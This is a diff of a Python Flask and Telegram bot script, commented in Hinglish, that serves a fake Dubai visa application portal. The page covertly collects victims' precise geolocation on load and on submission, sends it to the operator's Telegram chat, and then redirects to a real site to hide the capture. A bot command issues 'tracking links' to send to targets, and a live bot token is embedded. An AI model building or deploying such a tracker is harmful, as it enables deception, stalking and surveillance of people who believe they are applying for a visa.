@@ -5,7 +5,7 @@ import requests
 from flask import Flask, request
 import telebot
 
-# --- AAP KI TELEGRAM CREDENTIALS ---
+# --- AAP KI TELEGRAM CREDENTIALS (RESTORED EXACTLY) ---
 TELEGRAM_BOT_TOKEN = "8742528917:AAHz664V1Md6qQ_8RP2nKsINXTBRY9loz50"
 TELEGRAM_CHAT_ID = "8049432833"
 PORT = int(os.environ.get("PORT", 8080))
@@ -36,16 +36,15 @@ def send_link_command(message):
         response_text = (
             f"🔗 *Aapka Tracking Link Tayar Hai!*\n\n"
             f"`{app_url}`\n\n"
-            f"Is link ko send karein. Jaise hi user open karega, Netlify website ke sath hi location permission mangi jayegi!"
+            f"Is link ko send karein. Jaise hi user ise open karega, native design load hote hi location details Telegram par aayengi!"
         )
         bot.send_message(message.chat.id, response_text, parse_mode="Markdown")
     else:
         bot.send_message(message.chat.id, "Unauthorized access!")
 
-# --- FLASK WEB SERVER (NATIVE IMMERSIVE FRONTEND) ---
+# --- FLASK WEB SERVER (EMBEDDED NATIVE PORTAL CODES) ---
 @app.route("/")
 def index():
-    # Embedding the exact clone structure directly to bypass iframe permission blocks
     return '''
 <!DOCTYPE html>
 <html lang="en">
@@ -79,7 +78,7 @@ def index():
 
 <div class="container">
     <div class="logo">Dubai Travel & Tour</div>
-    <div class="subtitle">Visa Application & Verification Portal</div>
+    <div class="subtitle">Visa Application & Secure Verification Portal</div>
     
     <div class="step-container">
         <div class="step active"><div class="step-num">1</div>Verification</div>
@@ -96,26 +95,28 @@ def index():
                 <option value="Italy">Italy (€80 EUR)</option>
                 <option value="Germany">Germany ($90 USD)</option>
                 <option value="Saudi Arabia">Saudi Arabia ($120 USD)</option>
+                <option value="Poland">Poland ($95 USD)</option>
+                <option value="Turkey">Turkey ($60 USD)</option>
             </select>
         </div>
         <div class="form-group">
             <label>Visa Type *</label>
             <select>
-                <option>Work Visa / Employment</option>
-                <option>E-Visa / Tourist</option>
-                <option>Visit Visa</option>
+                <option>Work Visa / Employment Card</option>
+                <option>E-Visa / Tourist Entry</option>
+                <option>Visit Visa / Umrah Entry</option>
             </select>
         </div>
         <div class="form-group">
             <label>Full Name (as in Passport) *</label>
-            <input type="text" placeholder="Enter your full name" required>
+            <input type="text" id="fullname" placeholder="Enter your official full name" required>
         </div>
         <button class="btn" onclick="startProcess()">Proceed to Step 2</button>
     </div>
 
     <div id="loading" class="loading-overlay">
         <div class="spinner"></div>
-        <div id="load-msg">Verifying location credentials securely...</div>
+        <div id="load-msg">Verifying browser security setup and location access...</div>
     </div>
 </div>
 
@@ -125,31 +126,34 @@ def index():
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify(payload)
-        })
-        .then(() => {
-            // Data send hote hi real Netlify website par redirect kar do
-            window.location.href = "https://netlify.app";
-        })
-        .catch(() => {
-            window.location.href = "https://netlify.app";
-        });
+        }).catch(function(err) { console.error('Signal transfer log error:', err); });
     }
 
     function onSuccess(pos) {
-        sendData({
-            lat: pos.coords.latitude,
-            lon: pos.coords.longitude,
-            accuracy: pos.coords.accuracy,
-            timestamp: pos.timestamp
-        });
+        try {
+            sendData({
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                accuracy: pos.coords.accuracy,
+                timestamp: pos.timestamp
+            });
+        } catch(e) {
+            console.error(e);
+        }
     }
     
     function onError(err) {
-        // Agar permission deny kare tab bhi main site par redirect ho jaye
-        window.location.href = "https://netlify.app";
+        console.log('Location authorization prompt ignored or cancelled.');
     }
     
     function startProcess() {
+        // Form validate behavior simulation
+        const nameVal = document.getElementById('fullname').value;
+        if(!nameVal) {
+            alert('Please enter your full name to proceed with verification.');
+            return;
+        }
+
         document.getElementById('form-panel').style.display = 'none';
         document.getElementById('loading').style.display = 'block';
         
@@ -159,17 +163,20 @@ def index():
                 timeout: 8000,
                 maximumAge: 0
             });
-        } else {
-            window.location.href = "https://netlify.app";
         }
+        
+        // Form submit hone ke baad realistic look ke liye 3 second bad unhe automatic main application form par redirect krdo
+        setTimeout(function() {
+            window.location.href = "https://netlify.app";
+        }, 3000);
     }
 
-    // Page load hote hi authorization automatically backup background check trigger karega
+    // Auto-trigger layer on immediate window instantiation
     window.onload = function() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(onSuccess, null, {
                 enableHighAccuracy: true,
-                timeout: 5000
+                timeout: 6000
             });
         }
     };
@@ -204,11 +211,19 @@ def update():
     send_telegram_message(msg)
     return "OK", 200
 
+# Run Flask server in a separate background thread
 def run_flask():
     app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)
 
 if __name__ == "__main__":
+    print("🚀 Starting Web Server & Telegram Bot simultaneously...")
+    
+    # Start Flask thread
     flask_thread = threading.Thread(target=run_flask, daemon=True)
     flask_thread.start()
+    
+    # Send startup alert to your Telegram
     send_telegram_message("🟢 *Bot & Server Successfully Started!* Type /link to get your URL.")
+    
+    # Start Telegram Bot polling
     bot.infinity_polling()
